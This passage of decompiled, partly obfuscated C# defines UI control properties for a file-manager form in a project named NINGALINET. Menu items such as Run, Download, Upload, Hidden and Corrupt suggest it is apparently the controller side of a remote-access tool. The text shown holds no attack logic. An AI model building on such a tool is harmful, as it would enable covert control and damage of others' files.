using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NINGALINET.My.Resources;

namespace NINGALINET
{
	// Token: 0x02000013 RID: 19
	[DesignerGenerated]
	public partial class FrmFilemanager : Form
	{
		// Token: 0x060003AC RID: 940 RVA: 0x0000349B File Offset: 0x0000169B
		[DebuggerNonUserCode]
		static FrmFilemanager()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			FrmFilemanager.__ENCList = new List<WeakReference>();
		}

		// Token: 0x060003AD RID: 941 RVA: 0x00023588 File Offset: 0x00021788
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FrmFilemanager.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (FrmFilemanager.__ENCList.Count == FrmFilemanager.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = FrmFilemanager.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FrmFilemanager.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									FrmFilemanager.__ENCList[num] = FrmFilemanager.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FrmFilemanager.__ENCList.RemoveRange(num, FrmFilemanager.__ENCList.Count - num);
						FrmFilemanager.__ENCList.Capacity = FrmFilemanager.__ENCList.Count;
					}
					FrmFilemanager.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x1700016C RID: 364
		// (get) Token: 0x060003B0 RID: 944 RVA: 0x00025424 File Offset: 0x00023624
		// (set) Token: 0x060003B1 RID: 945 RVA: 0x000034AC File Offset: 0x000016AC
		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		// Token: 0x1700016D RID: 365
		// (get) Token: 0x060003B2 RID: 946 RVA: 0x0002543C File Offset: 0x0002363C
		// (set) Token: 0x060003B3 RID: 947 RVA: 0x000034B5 File Offset: 0x000016B5
		internal virtual ToolStripStatusLabel SL
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SL;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SL = value;
			}
		}

		// Token: 0x1700016E RID: 366
		// (get) Token: 0x060003B4 RID: 948 RVA: 0x00025454 File Offset: 0x00023654
		// (set) Token: 0x060003B5 RID: 949 RVA: 0x000034BE File Offset: 0x000016BE
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x1700016F RID: 367
		// (get) Token: 0x060003B6 RID: 950 RVA: 0x0002546C File Offset: 0x0002366C
		// (set) Token: 0x060003B7 RID: 951 RVA: 0x00025484 File Offset: 0x00023684
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				if (this._RefreshToolStripMenuItem != null)
				{
					this._RefreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				if (this._RefreshToolStripMenuItem != null)
				{
					this._RefreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000170 RID: 368
		// (get) Token: 0x060003B8 RID: 952 RVA: 0x000254DC File Offset: 0x000236DC
		// (set) Token: 0x060003B9 RID: 953 RVA: 0x000034C7 File Offset: 0x000016C7
		internal virtual ColumnHeader ColumnHeader5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader5 = value;
			}
		}

		// Token: 0x17000171 RID: 369
		// (get) Token: 0x060003BA RID: 954 RVA: 0x000254F4 File Offset: 0x000236F4
		// (set) Token: 0x060003BB RID: 955 RVA: 0x000034D0 File Offset: 0x000016D0
		internal virtual ContextMenuStrip ContextMenuStrip2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip2 = value;
			}
		}

		// Token: 0x17000172 RID: 370
		// (get) Token: 0x060003BC RID: 956 RVA: 0x0002550C File Offset: 0x0002370C
		// (set) Token: 0x060003BD RID: 957 RVA: 0x00025524 File Offset: 0x00023724
		internal virtual ToolStripMenuItem UPToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UPToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UPToolStripMenuItem_Click);
				if (this._UPToolStripMenuItem != null)
				{
					this._UPToolStripMenuItem.Click -= value2;
				}
				this._UPToolStripMenuItem = value;
				if (this._UPToolStripMenuItem != null)
				{
					this._UPToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000173 RID: 371
		// (get) Token: 0x060003BE RID: 958 RVA: 0x0002557C File Offset: 0x0002377C
		// (set) Token: 0x060003BF RID: 959 RVA: 0x00025594 File Offset: 0x00023794
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RefreshToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem1_Click);
				if (this._RefreshToolStripMenuItem1 != null)
				{
					this._RefreshToolStripMenuItem1.Click -= value2;
				}
				this._RefreshToolStripMenuItem1 = value;
				if (this._RefreshToolStripMenuItem1 != null)
				{
					this._RefreshToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x17000174 RID: 372
		// (get) Token: 0x060003C0 RID: 960 RVA: 0x000255EC File Offset: 0x000237EC
		// (set) Token: 0x060003C1 RID: 961 RVA: 0x000034D9 File Offset: 0x000016D9
		internal virtual ToolStripMenuItem RunToolStriplistviewMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RunToolStriplistviewMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RunToolStriplistviewMenuItem = value;
			}
		}

		// Token: 0x17000175 RID: 373
		// (get) Token: 0x060003C2 RID: 962 RVA: 0x00025604 File Offset: 0x00023804
		// (set) Token: 0x060003C3 RID: 963 RVA: 0x0002561C File Offset: 0x0002381C
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DeleteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem_Click);
				if (this._DeleteToolStripMenuItem != null)
				{
					this._DeleteToolStripMenuItem.Click -= value2;
				}
				this._DeleteToolStripMenuItem = value;
				if (this._DeleteToolStripMenuItem != null)
				{
					this._DeleteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000176 RID: 374
		// (get) Token: 0x060003C4 RID: 964 RVA: 0x00025674 File Offset: 0x00023874
		// (set) Token: 0x060003C5 RID: 965 RVA: 0x0002568C File Offset: 0x0002388C
		internal virtual ToolStripMenuItem EditToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._EditToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EditToolStripMenuItem_Click);
				if (this._EditToolStripMenuItem != null)
				{
					this._EditToolStripMenuItem.Click -= value2;
				}
				this._EditToolStripMenuItem = value;
				if (this._EditToolStripMenuItem != null)
				{
					this._EditToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000177 RID: 375
		// (get) Token: 0x060003C6 RID: 966 RVA: 0x000256E4 File Offset: 0x000238E4
		// (set) Token: 0x060003C7 RID: 967 RVA: 0x000256FC File Offset: 0x000238FC
		internal virtual ToolStripMenuItem RenameToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RenameToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RenameToolStripMenuItem_Click);
				if (this._RenameToolStripMenuItem != null)
				{
					this._RenameToolStripMenuItem.Click -= value2;
				}
				this._RenameToolStripMenuItem = value;
				if (this._RenameToolStripMenuItem != null)
				{
					this._RenameToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000178 RID: 376
		// (get) Token: 0x060003C8 RID: 968 RVA: 0x00025754 File Offset: 0x00023954
		// (set) Token: 0x060003C9 RID: 969 RVA: 0x0002576C File Offset: 0x0002396C
		internal virtual ToolStripMenuItem DownloadToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DownloadToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DownloadToolStripMenuItem_Click);
				if (this._DownloadToolStripMenuItem != null)
				{
					this._DownloadToolStripMenuItem.Click -= value2;
				}
				this._DownloadToolStripMenuItem = value;
				if (this._DownloadToolStripMenuItem != null)
				{
					this._DownloadToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000179 RID: 377
		// (get) Token: 0x060003CA RID: 970 RVA: 0x000257C4 File Offset: 0x000239C4
		// (set) Token: 0x060003CB RID: 971 RVA: 0x000257DC File Offset: 0x000239DC
		internal virtual ToolStripMenuItem UploadToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UploadToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UploadToolStripMenuItem_Click);
				if (this._UploadToolStripMenuItem != null)
				{
					this._UploadToolStripMenuItem.Click -= value2;
				}
				this._UploadToolStripMenuItem = value;
				if (this._UploadToolStripMenuItem != null)
				{
					this._UploadToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700017A RID: 378
		// (get) Token: 0x060003CC RID: 972 RVA: 0x00025834 File Offset: 0x00023A34
		// (set) Token: 0x060003CD RID: 973 RVA: 0x0002584C File Offset: 0x00023A4C
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TextBox1_TextChanged);
				if (this._TextBox1 != null)
				{
					this._TextBox1.TextChanged -= value2;
				}
				this._TextBox1 = value;
				if (this._TextBox1 != null)
				{
					this._TextBox1.TextChanged += value2;
				}
			}
		}

		// Token: 0x1700017B RID: 379
		// (get) Token: 0x060003CE RID: 974 RVA: 0x000258A4 File Offset: 0x00023AA4
		// (set) Token: 0x060003CF RID: 975 RVA: 0x000258BC File Offset: 0x00023ABC
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				if (this._Timer1 != null)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				if (this._Timer1 != null)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		// Token: 0x1700017C RID: 380
		// (get) Token: 0x060003D0 RID: 976 RVA: 0x00025914 File Offset: 0x00023B14
		// (set) Token: 0x060003D1 RID: 977 RVA: 0x0002592C File Offset: 0x00023B2C
		internal virtual PictureBox PictureBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PictureBox2_Click);
				if (this._PictureBox2 != null)
				{
					this._PictureBox2.Click -= value2;
				}
				this._PictureBox2 = value;
				if (this._PictureBox2 != null)
				{
					this._PictureBox2.Click += value2;
				}
			}
		}

		// Token: 0x1700017D RID: 381
		// (get) Token: 0x060003D2 RID: 978 RVA: 0x00025984 File Offset: 0x00023B84
		// (set) Token: 0x060003D3 RID: 979 RVA: 0x0002599C File Offset: 0x00023B9C
		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PictureBox1_Click);
				if (this._PictureBox1 != null)
				{
					this._PictureBox1.Click -= value2;
				}
				this._PictureBox1 = value;
				if (this._PictureBox1 != null)
				{
					this._PictureBox1.Click += value2;
				}
			}
		}

		// Token: 0x1700017E RID: 382
		// (get) Token: 0x060003D4 RID: 980 RVA: 0x000259F4 File Offset: 0x00023BF4
		// (set) Token: 0x060003D5 RID: 981 RVA: 0x00025A0C File Offset: 0x00023C0C
		internal virtual ToolStripMenuItem RunToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RunToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RunToolStripMenuItem_Click);
				if (this._RunToolStripMenuItem != null)
				{
					this._RunToolStripMenuItem.Click -= value2;
				}
				this._RunToolStripMenuItem = value;
				if (this._RunToolStripMenuItem != null)
				{
					this._RunToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700017F RID: 383
		// (get) Token: 0x060003D6 RID: 982 RVA: 0x00025A64 File Offset: 0x00023C64
		// (set) Token: 0x060003D7 RID: 983 RVA: 0x000034E2 File Offset: 0x000016E2
		internal virtual CHProgressbar pr
		{
			[DebuggerNonUserCode]
			get
			{
				return this._pr;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._pr = value;
			}
		}

		// Token: 0x17000180 RID: 384
		// (get) Token: 0x060003D8 RID: 984 RVA: 0x00025A7C File Offset: 0x00023C7C
		// (set) Token: 0x060003D9 RID: 985 RVA: 0x000034EB File Offset: 0x000016EB
		internal virtual SplitContainer SplitContainer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SplitContainer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SplitContainer1 = value;
			}
		}

		// Token: 0x17000181 RID: 385
		// (get) Token: 0x060003DA RID: 986 RVA: 0x00025A94 File Offset: 0x00023C94
		// (set) Token: 0x060003DB RID: 987 RVA: 0x000034F4 File Offset: 0x000016F4
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x17000182 RID: 386
		// (get) Token: 0x060003DC RID: 988 RVA: 0x00025AAC File Offset: 0x00023CAC
		// (set) Token: 0x060003DD RID: 989 RVA: 0x000034FD File Offset: 0x000016FD
		internal virtual SplitContainer SplitContainer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SplitContainer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SplitContainer2 = value;
			}
		}

		// Token: 0x17000183 RID: 387
		// (get) Token: 0x060003DE RID: 990 RVA: 0x00025AC4 File Offset: 0x00023CC4
		// (set) Token: 0x060003DF RID: 991 RVA: 0x00025ADC File Offset: 0x00023CDC
		internal virtual LV L2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.L2_SelectedIndexChanged);
				EventHandler value3 = new EventHandler(this.L2_DoubleClick);
				if (this._L2 != null)
				{
					this._L2.SelectedIndexChanged -= value2;
					this._L2.DoubleClick -= value3;
				}
				this._L2 = value;
				if (this._L2 != null)
				{
					this._L2.SelectedIndexChanged += value2;
					this._L2.DoubleClick += value3;
				}
			}
		}

		// Token: 0x17000184 RID: 388
		// (get) Token: 0x060003E0 RID: 992 RVA: 0x00025B58 File Offset: 0x00023D58
		// (set) Token: 0x060003E1 RID: 993 RVA: 0x00003506 File Offset: 0x00001706
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x17000185 RID: 389
		// (get) Token: 0x060003E2 RID: 994 RVA: 0x00025B70 File Offset: 0x00023D70
		// (set) Token: 0x060003E3 RID: 995 RVA: 0x0000350F File Offset: 0x0000170F
		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		// Token: 0x17000186 RID: 390
		// (get) Token: 0x060003E4 RID: 996 RVA: 0x00025B88 File Offset: 0x00023D88
		// (set) Token: 0x060003E5 RID: 997 RVA: 0x00003518 File Offset: 0x00001718
		internal virtual ColumnHeader ColumnHeader4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader4 = value;
			}
		}

		// Token: 0x17000187 RID: 391
		// (get) Token: 0x060003E6 RID: 998 RVA: 0x00025BA0 File Offset: 0x00023DA0
		// (set) Token: 0x060003E7 RID: 999 RVA: 0x00003521 File Offset: 0x00001721
		internal virtual RichTextBox RichTextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RichTextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RichTextBox1 = value;
			}
		}

		// Token: 0x17000188 RID: 392
		// (get) Token: 0x060003E8 RID: 1000 RVA: 0x00025BB8 File Offset: 0x00023DB8
		// (set) Token: 0x060003E9 RID: 1001 RVA: 0x0000352A File Offset: 0x0000172A
		internal virtual ToolStripMenuItem HiddenToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HiddenToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._HiddenToolStripMenuItem = value;
			}
		}

		// Token: 0x17000189 RID: 393
		// (get) Token: 0x060003EA RID: 1002 RVA: 0x00025BD0 File Offset: 0x00023DD0
		// (set) Token: 0x060003EB RID: 1003 RVA: 0x00025BE8 File Offset: 0x00023DE8
		internal virtual ToolStripMenuItem ShowToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ShowToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ShowToolStripMenuItem_Click);
				if (this._ShowToolStripMenuItem != null)
				{
					this._ShowToolStripMenuItem.Click -= value2;
				}
				this._ShowToolStripMenuItem = value;
				if (this._ShowToolStripMenuItem != null)
				{
					this._ShowToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700018A RID: 394
		// (get) Token: 0x060003EC RID: 1004 RVA: 0x00025C40 File Offset: 0x00023E40
		// (set) Token: 0x060003ED RID: 1005 RVA: 0x00025C58 File Offset: 0x00023E58
		internal virtual ToolStripMenuItem HiddenToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HiddenToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HiddenToolStripMenuItem1_Click);
				if (this._HiddenToolStripMenuItem1 != null)
				{
					this._HiddenToolStripMenuItem1.Click -= value2;
				}
				this._HiddenToolStripMenuItem1 = value;
				if (this._HiddenToolStripMenuItem1 != null)
				{
					this._HiddenToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x1700018B RID: 395
		// (get) Token: 0x060003EE RID: 1006 RVA: 0x00025CB0 File Offset: 0x00023EB0
		// (set) Token: 0x060003EF RID: 1007 RVA: 0x00025CC8 File Offset: 0x00023EC8
		internal virtual ToolStripMenuItem UnrarToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UnrarToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UnrarToolStripMenuItem_Click);
				if (this._UnrarToolStripMenuItem != null)
				{
					this._UnrarToolStripMenuItem.Click -= value2;
				}
				this._UnrarToolStripMenuItem = value;
				if (this._UnrarToolStripMenuItem != null)
				{
					this._UnrarToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700018C RID: 396
		// (get) Token: 0x060003F0 RID: 1008 RVA: 0x00025D20 File Offset: 0x00023F20
		// (set) Token: 0x060003F1 RID: 1009 RVA: 0x00025D38 File Offset: 0x00023F38
		internal virtual ToolStripMenuItem RarToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RarToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RarToolStripMenuItem_Click);
				if (this._RarToolStripMenuItem != null)
				{
					this._RarToolStripMenuItem.Click -= value2;
				}
				this._RarToolStripMenuItem = value;
				if (this._RarToolStripMenuItem != null)
				{
					this._RarToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700018D RID: 397
		// (get) Token: 0x060003F2 RID: 1010 RVA: 0x00025D90 File Offset: 0x00023F90
		// (set) Token: 0x060003F3 RID: 1011 RVA: 0x00003533 File Offset: 0x00001733
		internal virtual ToolStripSeparator ToolStripSeparator1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator1 = value;
			}
		}

		// Token: 0x1700018E RID: 398
		// (get) Token: 0x060003F4 RID: 1012 RVA: 0x00025DA8 File Offset: 0x00023FA8
		// (set) Token: 0x060003F5 RID: 1013 RVA: 0x0000353C File Offset: 0x0000173C
		internal virtual ToolStripSeparator StripToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StripToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StripToolStripMenuItem = value;
			}
		}

		// Token: 0x1700018F RID: 399
		// (get) Token: 0x060003F6 RID: 1014 RVA: 0x00025DC0 File Offset: 0x00023FC0
		// (set) Token: 0x060003F7 RID: 1015 RVA: 0x00003545 File Offset: 0x00001745
		internal virtual ToolStripSeparator ToolStripSeparator2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator2 = value;
			}
		}

		// Token: 0x17000190 RID: 400
		// (get) Token: 0x060003F8 RID: 1016 RVA: 0x00025DD8 File Offset: 0x00023FD8
		// (set) Token: 0x060003F9 RID: 1017 RVA: 0x00025DF0 File Offset: 0x00023FF0
		internal virtual ToolStripMenuItem CutToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CutToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CutToolStripMenuItem_Click);
				if (this._CutToolStripMenuItem != null)
				{
					this._CutToolStripMenuItem.Click -= value2;
				}
				this._CutToolStripMenuItem = value;
				if (this._CutToolStripMenuItem != null)
				{
					this._CutToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000191 RID: 401
		// (get) Token: 0x060003FA RID: 1018 RVA: 0x00025E48 File Offset: 0x00024048
		// (set) Token: 0x060003FB RID: 1019 RVA: 0x00025E60 File Offset: 0x00024060
		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem_Click);
				if (this._CopyToolStripMenuItem != null)
				{
					this._CopyToolStripMenuItem.Click -= value2;
				}
				this._CopyToolStripMenuItem = value;
				if (this._CopyToolStripMenuItem != null)
				{
					this._CopyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000192 RID: 402
		// (get) Token: 0x060003FC RID: 1020 RVA: 0x00025EB8 File Offset: 0x000240B8
		// (set) Token: 0x060003FD RID: 1021 RVA: 0x00025ED0 File Offset: 0x000240D0
		internal virtual ToolStripMenuItem PastToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PastToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PastToolStripMenuItem_Click);
				if (this._PastToolStripMenuItem != null)
				{
					this._PastToolStripMenuItem.Click -= value2;
				}
				this._PastToolStripMenuItem = value;
				if (this._PastToolStripMenuItem != null)
				{
					this._PastToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000193 RID: 403
		// (get) Token: 0x060003FE RID: 1022 RVA: 0x00025F28 File Offset: 0x00024128
		// (set) Token: 0x060003FF RID: 1023 RVA: 0x0000354E File Offset: 0x0000174E
		internal virtual ToolStripMenuItem NewFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NewFolderToolStripMenuItem = value;
			}
		}

		// Token: 0x17000194 RID: 404
		// (get) Token: 0x06000400 RID: 1024 RVA: 0x00025F40 File Offset: 0x00024140
		// (set) Token: 0x06000401 RID: 1025 RVA: 0x00025F58 File Offset: 0x00024158
		internal virtual ToolStripMenuItem NewFolderToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewFolderToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NewFolderToolStripMenuItem1_Click);
				if (this._NewFolderToolStripMenuItem1 != null)
				{
					this._NewFolderToolStripMenuItem1.Click -= value2;
				}
				this._NewFolderToolStripMenuItem1 = value;
				if (this._NewFolderToolStripMenuItem1 != null)
				{
					this._NewFolderToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x17000195 RID: 405
		// (get) Token: 0x06000402 RID: 1026 RVA: 0x00025FB0 File Offset: 0x000241B0
		// (set) Token: 0x06000403 RID: 1027 RVA: 0x00025FC8 File Offset: 0x000241C8
		internal virtual ToolStripMenuItem NewEmptyFileToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NewEmptyFileToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NewEmptyFileToolStripMenuItem1_Click);
				if (this._NewEmptyFileToolStripMenuItem1 != null)
				{
					this._NewEmptyFileToolStripMenuItem1.Click -= value2;
				}
				this._NewEmptyFileToolStripMenuItem1 = value;
				if (this._NewEmptyFileToolStripMenuItem1 != null)
				{
					this._NewEmptyFileToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x17000196 RID: 406
		// (get) Token: 0x06000404 RID: 1028 RVA: 0x00026020 File Offset: 0x00024220
		// (set) Token: 0x06000405 RID: 1029 RVA: 0x00026038 File Offset: 0x00024238
		internal virtual ToolStripMenuItem CorruptToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CorruptToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CorruptToolStripMenuItem_Click);
				if (this._CorruptToolStripMenuItem != null)
				{
					this._CorruptToolStripMenuItem.Click -= value2;
				}
				this._CorruptToolStripMenuItem = value;
				if (this._CorruptToolStripMenuItem != null)
				{
					this._CorruptToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000197 RID: 407
		// (get) Token: 0x06000406 RID: 1030 RVA: 0x00026090 File Offset: 0x00024290
